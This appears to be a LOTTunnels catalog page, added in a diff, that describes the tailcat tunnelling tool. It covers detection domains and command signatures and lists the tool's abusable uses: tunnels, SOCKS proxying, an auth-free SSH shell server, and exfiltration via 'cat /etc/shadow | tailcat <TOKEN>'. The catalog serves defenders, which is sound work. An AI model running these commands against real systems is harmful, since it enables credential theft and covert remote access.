@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Tailcat | LOTTunnels</title>
+    <link rel="icon" href="/assets/favicon.png">
+    <link rel="stylesheet" href="/assets/style.css" type="text/css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
+    <script async defer src="https://buttons.github.io/buttons.js"></script><meta name="title" content="Tailcat on LOTTunnels">
+    <meta name="description" content="Tailcat is a living-off-the-tunnels file containing unexpected functionality that can be abused by attackers; this page lists all its use cases.">
+    <meta property="og:title" name="og:title" content="Tailcat on LOTTunnels">
+    <meta property="og:site_name" name="og:site_name" content="LOTTunnels">
+    <meta property="og:type" name="og:type" content="object">
+    <meta property="og:url" name="og:url" content="http://localhost:4000/lottunnels/Binaries/tailcat/">
+    <meta property="og:image" name="og:image" content="http://localhost:4000/assets/favicon.png">
+    <meta property="og:description" name="og:description" content="Tailcat is a living-of-the-tunnels file containing unexpected functionality that can be abused by attackers; this page lists all its use cases.">
+</head>
+<body>
+    <a href="https://github.com/LOTTunnels/LOTTunnels.github.io" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    	<h1><a href="/">..</a> /Tailcat<div class="github-buttons">
+        <a class="github-button" href="https://github.com/LOTTunnels/LOTTunnels.github.io" data-icon="octicon-star" data-show-count="true" aria-label="Star LOTTunnels/LOTTunnels.github.io on GitHub">Star</a>
+    </div>
+</h1>
+
+	<div class="function-list"><div><a href="/lottunnels/Binaries/tailcat/#install">Install</a></div><div><a href="/lottunnels/Binaries/tailcat/#access">Access</a></div><div><a href="/lottunnels/Binaries/tailcat/#shell-access">Shell Access</a></div><div><a href="/lottunnels/Binaries/tailcat/#exfiltrate">Exfiltration</a></div></div>
+
+	<p>Tailcat is netcat over Tailscale’s data plane without the control plane. It reuses Tailscale’s open WireGuard, magicsock, and DERP code. One side starts a server and gets a short token (tc…), the other connects with it. Connections start through a DERP relay and try to upgrade to direct UDP. If hole punching fails, traffic stays relayed. No account or root needed. It runs entirely in userspace, works with custom DERP servers, has a browser WASM demo, and can publish tokens as DNS TXT records.</p>
+
+
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133649096-1"></script>
+	<script>
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+
+	gtag('config', 'UA-133649096-1');
+	</script>
+
+	<script src="/assets/url_helper.js"></script>
+	<section class="detail-section paths-section">
+		<h3>Paths:</h3>
+		<ul class="path-list" style="list-style-type:none">
+			<li data-file-path></li>
+		</ul>
+	</section>
+	<section class="detail-section resources-section">
+		<h3>Resources:</h3>
+		<ul>
+			<li><a href="https://github.com/tailscale/tailcat">https://github.com/tailscale/tailcat</a></li>
+			<li><a href="https://tailscale.github.io/tailcat/">https://tailscale.github.io/tailcat/</a></li>
+			<li><a href="https://tailcat.dev/derpmap.json">https://tailcat.dev/derpmap.json</a></li>
+			<li><a href="https://pkg.go.dev/github.com/tailscale/tailcat">https://pkg.go.dev/github.com/tailscale/tailcat</a></li>
+		</ul>
+	</section>
+	
+	
+	<section class="detail-section detections-section">
+		<h3>Detections:</h3>
+		<ul>
+			<li>Domain: <a href="tc301a.ipn.dev" target="_blank" data-shorten="true">tc301a.ipn.dev</a></li>
+			<li>Domain: <a href="tc302a.ipn.dev" target="_blank" data-shorten="true">tc302a.ipn.dev</a></li>
+			<li>Domain: <a href="tc303a.ipn.dev" target="_blank" data-shorten="true">tc303a.ipn.dev</a></li>
+			<li>Domain: <a href="tc304a.ipn.dev" target="_blank" data-shorten="true">tc304a.ipn.dev</a></li>
+			<li>Command: <a href="Execution of the tailcat binary, including with subcommands genkey, parse, resolve, ping, socks, ssh and flags --serve, --key, --derpmap-url, --full-address, --allow." target="_blank" data-shorten="true">Execution of the tailcat binary, including with subcommands genkey, parse, resolve, ping, socks, ssh and flags --serve, --key, --derpmap-url, --full-address, --allow.</a></li>
+		</ul>
+	</section>
+
+	<section class="command-sections">
+		<h2 id="install" class="function-name">Install</h2>
+		<ol>
+			<li>
+				<p>Installs the tailcat CLI (also available via nix run github:tailscale/tailcat).</p>
+				<pre><code>go install github.com/tailscale/tailcat/cmd/tailcat@latest</code></pre>
+				<div class="properties">
+					<dl class="row"><dt class="property">Use case</dt><dd>Install the tailcat binary to create WireGuard tunnels without the control plane.</dd></dl>
+					<dl class="row"><dt class="property">Privileges required</dt><dd>User</dd></dl>
+					<dl class="row"><dt class="property">Operating systems</dt><dd>Windows, Linux, MacOS, BSD</dd></dl>
+				</div>
+			</li>
+		</ol>
+		<h2 id="access" class="function-name">Access</h2>
+		<ol>
+			<li>
+				<p>Starts an ephemeral server (generates a fresh in-memory WireGuard key) that pipes stdin/stdout over the tunnel and prints its token (e.g. tcomFwWCC...). With --serve=&lt;PORT|all|exit-node&gt; it forwards a local TCP port or acts as an exit node instead of piping stdio.</p>
+				<pre><code>tailcat</code></pre>
+				<div class="properties">
+					<dl class="row"><dt class="property">Use case</dt><dd>Create a one-time encrypted tunnel and expose stdin/stdout or a local service through it; exit-node mode routes the client&#39;s traffic via the server&#39;s network.</dd></dl>
+					<dl class="row"><dt class="property">Privileges required</dt><dd>User</dd></dl>
+					<dl class="row"><dt class="property">Operating systems</dt><dd>Windows, Linux, MacOS, BSD</dd></dl>
+				</div>
+			</li><li>
+				<p>Client connects to a tailcat server using its token and dials a TCP port through the WireGuard tunnel (gVisor netstack on both sides). Example - tailcat tcXXXXXXXXX 8080. With no PORT argument it connects stdin/stdout.</p>
+				<pre><code>tailcat &lt;TOKEN&gt; &lt;PORT&gt;</code></pre>
+				<div class="properties">
+					<dl class="row"><dt class="property">Use case</dt><dd>Reach an internal service or pipe data through the encrypted tunnel from outside the target network.</dd></dl>
+					<dl class="row"><dt class="property">Privileges required</dt><dd>User</dd></dl>
+					<dl class="row"><dt class="property">Operating systems</dt><dd>Windows, Linux, MacOS, BSD</dd></dl>
+				</div>
+			</li><li>
+				<p>Starts a SOCKS5 proxy routed over the tailcat tunnel. Any SOCKS-aware tool can be proxied (e.g. tailcat socks &lt;TOKEN&gt; curl ...). Tokens also work as case-sensitive URL hostnames directly (tailcat socks curl http://&lt;TOKEN&gt;:8081/).</p>
+				<pre><code>tailcat socks &lt;TOKEN&gt; -- curl http://server.tailcat:8081/</code></pre>
+				<div class="properties">
+					<dl class="row"><dt class="property">Use case</dt><dd>Proxy arbitrary TCP traffic and tools through the tunnel to reach the server&#39;s network or localhost services.</dd></dl>
+					<dl class="row"><dt class="property">Privileges required</dt><dd>User</dd></dl>
+					<dl class="row"><dt class="property">Operating systems</dt><dd>Windows, Linux, MacOS, BSD</dd></dl>
+				</div>
+			</li>
+		</ol>
+		<h2 id="shell-access" class="function-name">Shell Access</h2>
+		<ol>
+			<li>
+				<p>Runs an auth-free SSH server (Linux/macOS; uses gliderlabs/ssh with an ed25519 host key in ~/.config/tailcat/ssh/) reachable only over the tailcat tunnel. WireGuard authenticates the peer before SSH is reached. Use --serve=22 to proxy to the system SSH server with normal auth.</p>
+				<pre><code>tailcat --serve=no-auth-ssh</code></pre>
+				<div class="properties">
+					<dl class="row"><dt class="property">Use case</dt><dd>Persistent shell access to a host behind NAT/firewall with no inbound open ports and no credentials.</dd></dl>
+					<dl class="row"><dt class="property">Privileges required</dt><dd>User</dd></dl>
+					<dl class="row"><dt class="property">Operating systems</dt><dd>Linux, MacOS</dd></dl>
+				</div>
+			</li><li>
+				<p>SSH client over tailcat. Connects to a tailcat SSH server and either opens an interactive PTY shell or executes a single command (e.g. tailcat ssh tcXXXXXXXXX ls -la).</p>
+				<pre><code>tailcat ssh &lt;TOKEN&gt; [COMMAND]</code></pre>
+				<div class="properties">
+					<dl class="row"><dt class="property">Use case</dt><dd>Interactive or non-interactive remote shell through the WireGuard tunnel.</dd></dl>
+					<dl class="row"><dt class="property">Privileges required</dt><dd>User</dd></dl>
+					<dl class="row"><dt class="property">Operating systems</dt><dd>Windows, Linux, MacOS, BSD</dd></dl>
+				</div>
+			</li>
+		</ol>
+		<h2 id="exfiltrate" class="function-name">Exfiltration</h2>
+		<ol>
+			<li>
+				<p>Pipes a file or command output through the client into the server&#39;s stdout (server was started with bare tailcat and blocks until a client connects). Works in both directions for upload/download.</p>
+				<pre><code>cat /etc/shadow | tailcat &lt;TOKEN&gt;</code></pre>
+				<div class="properties">
+					<dl class="row"><dt class="property">Use case</dt><dd>Exfiltrate files or pipe data between two machines over the encrypted DERP-relayed / direct tunnel.</dd></dl>
+					<dl class="row"><dt class="property">Privileges required</dt><dd>User</dd></dl>
+					<dl class="row"><dt class="property">Operating systems</dt><dd>Windows, Linux, MacOS, BSD</dd></dl>
+				</div>
+			</li>
+		</ol>
+	</section>
+
+    <script>
+        // add permalink on headings
+        document.querySelectorAll('h2').forEach((heading) => {
+            const link = document.createElement('a');
+            link.className = 'permalink';
+            link.href = `#${heading.id}`;
+            heading.appendChild(link);
+        });
+    </script>
+</body>
+</html>
